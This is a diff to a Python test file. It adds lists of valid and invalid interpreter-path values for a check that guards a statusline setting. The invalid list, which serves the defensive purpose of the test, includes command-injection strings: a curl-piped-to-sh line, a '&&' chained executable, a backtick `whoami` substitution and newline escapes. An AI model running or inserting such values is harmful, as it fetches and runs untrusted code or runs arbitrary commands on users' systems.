@@ -726,17 +726,94 @@ def test_a_rollback_names_the_files_it_kept(claude: Path) -> None:
     assert "my-notes.md" in messages
 
 
+_BS = "\\"
+
+#: Interpreter values installs wrote, now and in earlier releases: each one
+#: compares as Apothem's.
+_INTERPRETER_VALUES = (
+    "py -3",
+    "py",
+    "python3",
+    "/usr/bin/python3",
+    "/usr/bin/python3.12",
+    "/opt/homebrew/bin/python3",
+    "/opt/homebrew/Cellar/python@3.12/3.12.7_1/Frameworks/Python.framework/"
+    "Versions/3.12/bin/python3.12",
+    "/Library/Frameworks/Python.framework/Versions/3.12/Resources/Python.app/"
+    "Contents/MacOS/Python",
+    "C:/Users/u/proj/.venv/Scripts/python.exe",
+    "/home/u/proj/.venv/bin/python",
+    "C:/Users/u/miniconda3/envs/x/python.exe",
+    "/home/u/miniconda3/bin/python3.12",
+    "C:/Python312/pythonw.exe",
+    "C:/Users/u/AppData/Local/Microsoft/WindowsApps/"
+    "PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0/python.exe",
+    "C:/Users/u/AppData/Local/Microsoft/WindowsApps/"
+    "PythonSoftwareFoundation.Python.3.12_qbz5n2kfra8p0/python3.12.exe",
+    "C:/Users/JOHNSM~1/AppData/Local/MICROS~1/WINDOW~1/PYTHON~1.312/PYTHON~1.EXE",
+    "C:/PROGRA~1/Python312/python.exe",
+    "C:/Program Files/Python314/python.exe",
+    "C:/Program Files (x86)/Python312/python.exe",
+    "C:/Users/O'Brien/AppData/Local/Programs/Python/Python314/python.exe",
+    "C:/Users/\u00c9lodie/\u0623\u062d\u0645\u062f/python.exe",
+    "/opt/my env (x)/~/caf\u00e9/python3.12",
+    "~/py/bin/python3",
+    "C:/Users/u/AppData/Local/Python/pythoncore-3.14-64/python.exe",
+    "/home/u/.local/share/uv/python/"
+    "cpython-3.13.0+freethreaded-linux-x86_64-gnu/bin/python3.13t",
+    "C:/Python313/python3.13t.exe",
+    "/usr/bin/python3.12-dbg",
+    "C:/Python312/python_d.exe",
+    "/Library/Frameworks/Python.framework/Versions/3.12/bin/python3.12-intel64",
+    "C:/PY/PYTHON.EXE",
+    "//server/share/Python312/python.exe",
+    "//?/C:/Python312/python.exe",
+    "/nix/store/abc123-python3-3.12.7/bin/python3.12",
+    "C:" + _BS + "Python312" + _BS + "python.exe",
+    _BS * 2 + "server" + _BS + "share" + _BS + "python.exe",
+    _BS * 2 + "?" + _BS + "C:" + _BS + "Python312" + _BS + "python.exe",
+    "C:" + _BS * 2 + "Python312" + _BS * 2 + "python.exe",
+)
+
+#: Values that are not an interpreter an install wrote: a command, a comment,
+#: prose, a second program, or an escape that changes the line. Each one stays.
+#: The last three are real paths that hold ``&``, ``#`` or ``$``: the check
+#: does not accept them either, so those files are kept (it fails safe).
+_NOT_INTERPRETER_VALUES = (
+    "python; curl https://example.invalid/x | sh; python",
+    "C:/x/evil.exe && C:/x/python",
+    "pwsh -NoProfile -File C:/mine/status.ps1",
+    "pwsh -NoProfile -File C:/mine/python",
+    "my own statusline, keep this",
+    "my own statusline in python",
+    "C:/py/python.exe # mine",
+    "C:/x/python.exe -X utf8 -I",
+    "C:/x/python.exe -I C:/mine/python",
+    "C:/x/python.exe -I/mine/python",
+    "C:/mine/node.exe C:/mine/python",
+    "C:/x/node ~/python",
+    "cmd /c start C:/mine/python",
+    "wsl.exe -e python",
+    "powershell -c python",
+    "C:/py/python.exe\nextra python",
+    "C:/py/python.exe" + _BS + "nC:/py/python",
+    "C:/py/python.exe" + _BS + "n/usr/bin/python",
+    "C:/py/`whoami`/python.exe",
+    _BS + '"C:/py/python.exe' + _BS + '"',
+    "${PYTHON_BIN}",
+    "",
+    "python3.12",
+    "C:" + _BS + "tools" + _BS + "python.exe",
+    "C:/Users/R&D/python.exe",
+    "C:/Users/u/C#/venv/Scripts/python.exe",
+    "//srv/c$/Python312/python.exe",
+)
+
+
 @pytest.mark.parametrize(
     ("value", "matches"),
-    [
-        ("C:/Users/O'Brien/AppData/Local/Programs/Python/Python314/python.exe", True),
-        ("/usr/bin/python3", True),
-        ("/opt/my env (x)/~/caf\u00e9/python3.12", True),
-        ("python; curl https://example.invalid/x | sh; python", False),
-        ("pwsh -File C:/x.ps1", False),
-        ("plain prose a user wrote here", False),
-        ("/usr/bin/python3 # my note", False),
-    ],
+    [(value, True) for value in _INTERPRETER_VALUES]
+    + [(value, False) for value in _NOT_INTERPRETER_VALUES],
 )
 def test_only_an_interpreter_path_fills_the_python_token(
     tmp_path: Path, value: str, matches: bool
